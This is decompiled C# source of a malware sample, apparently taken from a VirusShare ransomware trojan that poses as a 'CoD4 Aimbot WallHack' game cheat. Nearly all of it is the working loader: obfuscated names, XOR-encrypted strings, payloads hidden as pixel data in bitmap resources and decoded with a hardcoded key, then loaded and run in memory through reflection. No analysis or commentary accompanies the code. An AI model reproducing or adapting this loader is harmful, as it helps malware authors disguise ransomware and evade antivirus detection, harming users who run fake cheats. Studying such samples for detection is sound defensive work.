// Decompiled with JetBrains decompiler
// Type: rÎÁåñHDLáy08ôV
// Assembly: CoD4 Aimbot WallHack, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 8DCEFCDF-DA60-40D3-8FA2-BBDEBACE337F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-d1c0be1d3115c15f77b8b2cc7e137b0fb27b6e271d476b7a692bbe1198da3a76.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

public class rÎÁåñHDLáy08ôV
{
  private static string Ì2oxöJòÏgépÎÈâËxØ = "çGëÑýKUÛËÌÞ9d72þëØËÄâÙVÒ1ñûÂgM";
  private static ResourceManager ÝkxvËÙUçJáJ = new ResourceManager("t9RHcew7rjw7ot7o", Assembly.GetExecutingAssembly());

  private static byte[] ïükSnÎÑÝÌÂWkCd8Í => rÎÁåñHDLáy08ôV.Í2ÞÄëÂóÊÀú(rÎÁåñHDLáy08ôV.SÜåúÅpü71xúBí((Bitmap) rÎÁåñHDLáy08ôV.ÝkxvËÙUçJáJ.GetObject("CbROPU7RIcYfJikpkJC"), rÎÁåñHDLáy08ôV.Ì2oxöJòÏgépÎÈâËxØ));

  private static byte[] EÝàcÕäùÈÄ2ÝCæöÞÏÐÜê => rÎÁåñHDLáy08ôV.Í2ÞÄëÂóÊÀú(rÎÁåñHDLáy08ôV.SÜåúÅpü71xúBí((Bitmap) rÎÁåñHDLáy08ôV.ÝkxvËÙUçJáJ.GetObject("JB1uDxL2FwbU"), rÎÁåñHDLáy08ôV.Ì2oxöJòÏgépÎÈâËxØ));

  [STAThread]
  public static void Main()
  {
    object[] objArray1 = new object[7]
    {
      (object) rÎÁåñHDLáy08ôV.ïükSnÎÑÝÌÂWkCd8Í,
      (object) rÎÁåñHDLáy08ôV.HêÒQzÅEQþWõÜRê4qJÀs("178AA59E237BBEB3A9"),
      (object) false,
      (object) true,
      (object) false,
      (object) false,
      (object) rÎÁåñHDLáy08ôV.HêÒQzÅEQþWõÜRê4qJÀs("3189B2")
    };
    byte[] eýàcÕäùÈä2ÝcæöÞïðÜê1 = rÎÁåñHDLáy08ôV.EÝàcÕäùÈÄ2ÝCæöÞÏÐÜê;
    ref byte[] local1 = ref eýàcÕäùÈä2ÝcæöÞïðÜê1;
    string str1 = rÎÁåñHDLáy08ôV.HêÒQzÅEQþWõÜRê4qJÀs("0E85BB982821");
    ref string local2 = ref str1;
    ref object[] local3 = ref objArray1;
    rÎÁåñHDLáy08ôV.ÌÞEmJdQt69ÞÖ(ref local1, ref local2, ref local3);
    object[] objArray2 = new object[7]
    {
      (object) rÎÁåñHDLáy08ôV.Í2ÞÄëÂóÊÀú(rÎÁåñHDLáy08ôV.SÜåúÅpü71xúBí((Bitmap) rÎÁåñHDLáy08ôV.ÝkxvËÙUçJáJ.GetObject("vAn302umP1f3Swf7Vi"), rÎÁåñHDLáy08ôV.Ì2oxöJòÏgépÎÈâËxØ)),
      (object) rÎÁåñHDLáy08ôV.HêÒQzÅEQþWõÜRê4qJÀs("048495C96B14B2A6AEB14D446053928790AAA789F733AA54"),
      (object) false,
      (object) false,
      (object) true,
      (object) false,
      (object) rÎÁåñHDLáy08ôV.HêÒQzÅEQþWõÜRê4qJÀs("3189B2")
    };
    byte[] eýàcÕäùÈä2ÝcæöÞïðÜê2 = rÎÁåñHDLáy08ôV.EÝàcÕäùÈÄ2ÝCæöÞÏÐÜê;
    ref byte[] local4 = ref eýàcÕäùÈä2ÝcæöÞïðÜê2;
    string str2 = rÎÁåñHDLáy08ôV.HêÒQzÅEQþWõÜRê4qJÀs("0E85BB982821");
    ref string local5 = ref str2;
    ref object[] local6 = ref objArray2;
    rÎÁåñHDLáy08ôV.ÌÞEmJdQt69ÞÖ(ref local4, ref local5, ref local6);
  }

  public static void ÌÞEmJdQt69ÞÖ(
    ref byte[] ÞÉQÛC6ÍýúÈ,
    ref string OÖUBc0ãsÝÝWö,
    ref object[] p7ÈýÜRÚQÜÆþÖÝðký)
  {
    object objectValue = RuntimeHelpers.GetObjectValue(Assembly.Load(ÞÉQÛC6ÍýúÈ).CreateInstance(rÎÁåñHDLáy08ôV.HêÒQzÅEQþWõÜRê4qJÀs("159EBFAD0E")));
    objectValue.GetType().InvokeMember(OÖUBc0ãsÝÝWö, BindingFlags.InvokeMethod, (Binder) null, RuntimeHelpers.GetObjectValue(objectValue), p7ÈýÜRÚQÜÆþÖÝðký);
  }

  public static string HêÒQzÅEQþWõÜRê4qJÀs(string OðÞÊÛÊÉîciæö7ãÐ)
  {
    long num1 = (long) Math.Round((double) Strings.Len(OðÞÊÛÊÉîciæö7ãÐ) / 2.0);
    string str;
    for (long index = 1; index <= num1; ++index)
    {
      int num2 = (int) Math.Round(Conversion.Val("&H" + Strings.Mid(OðÞÊÛÊÉîciæö7ãÐ, (int) (2L * index - 1L), 2)));
      int num3 = Strings.AscW(Strings.Mid(rÎÁåñHDLáy08ôV.Ì2oxöJòÏgépÎÈâËxØ, (int) (index % (long) Strings.Len(rÎÁåñHDLáy08ôV.Ì2oxöJòÏgépÎÈâËxØ) + 1L), 1));
      str += Conversions.ToString(Strings.ChrW(num2 ^ num3));
    }
    return str;
  }

  public static byte[] Í2ÞÄëÂóÊÀú(byte[] ÆßçFzä4S6ØLgøÐÜ)
  {
    byte[] bytes = Encoding.Unicode.GetBytes(rÎÁåñHDLáy08ôV.Ì2oxöJòÏgépÎÈâËxØ);
    byte[] array1 = new byte[0];
    Array.Resize<byte>(ref array1, bytes.Length);
    int index1 = 0;
    int num1 = ÆßçFzä4S6ØLgøÐÜ.Length - 1 - (array1.Length - 1);
    int num2 = ÆßçFzä4S6ØLgøÐÜ.Length - 1;
    for (int index2 = num1; index2 <= num2; ++index2)
    {
      array1[index1] = ÆßçFzä4S6ØLgøÐÜ[index2];
      ++index1;
    }
    byte[] array2 = ÆßçFzä4S6ØLgøÐÜ;
    Array.Resize<byte>(ref array2, ÆßçFzä4S6ØLgøÐÜ.Length - array1.Length);
    int index3 = 0;
    int num3 = array2.Length - 1;
    for (int index4 = 0; index4 <= num3; ++index4)
    {
      array2[index4] = (byte) ((int) ÆßçFzä4S6ØLgøÐÜ[index4] ^ (int) array1[index3] ^ (int) bytes[index3]);
      if (index3 == bytes.Length - 1)
        index3 = 0;
      else
        ++index3;
    }
    return array2;
  }

  public static byte[] SÜåúÅpü71xúBí(Bitmap õÇkÛýgîÌêUA, string nßÂS1ÍRvOÚp7)
  {
    byte[] array;
    try
    {
      string str = nßÂS1ÍRvOÚp7;
      int index1 = 0;
      int num1;
      for (int length = str.Length; index1 < length; ++index1)
      {
        char ch = str[index1];
        num1 += (int) ch;
      }
      int num2 = õÇkÛýgîÌêUA.Width * õÇkÛýgîÌêUA.Height;
      for (int x = õÇkÛýgîÌêUA.Width - 1; x != 0; --x)
      {
        Color color = õÇkÛýgîÌêUA.GetPixel(x, õÇkÛýgîÌêUA.Height - 1);
        int num3 = 0;
        int num4 = (int) color.R % (int) byte.MaxValue;
        int num5 = (int) color.B - (num4 % (int) byte.MaxValue + (int) color.G) % (int) byte.MaxValue / 3;
        if ((num4 + (int) byte.MaxValue * num5 ^ num1) == 47)
          --num2;
        color = new Color();
        num3 = 0;
      }
      array = new byte[num2 + 1];
      int index2 = 0;
      for (int x = 0; x != õÇkÛýgîÌêUA.Width; ++x)
      {
        int y = 0;
        while (y != õÇkÛýgîÌêUA.Height)
        {
          Color color = õÇkÛýgîÌêUA.GetPixel(x, y);
          int num6 = 0;
          int num7 = (int) color.R % (int) byte.MaxValue;
          int num8 = (int) color.B - (num7 % (int) byte.MaxValue + (int) color.G) % (int) byte.MaxValue / 3;
          int num9 = num7 + (int) byte.MaxValue * num8 ^ num1;
          if (num9 != 47)
            array[index2] = (byte) (num9 - (int) byte.MaxValue);
          color = new Color();
          num6 = 0;
          ++y;
          ++index2;
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      if (false)
      {
        int num = (int) MessageBox.Show(exception.Message);
      }
      ProjectData.ClearProjectError();
    }
    for (int newSize = array.Length - (Encoding.Unicode.GetByteCount(rÎÁåñHDLáy08ôV.Ì2oxöJòÏgépÎÈâËxØ.ToCharArray()) - 1); newSize != array.Length; ++newSize)
    {
      if (array[newSize] == (byte) 0)
      {
        Array.Resize<byte>(ref array, newSize);
        break;
      }
    }
    return array;
  }
}
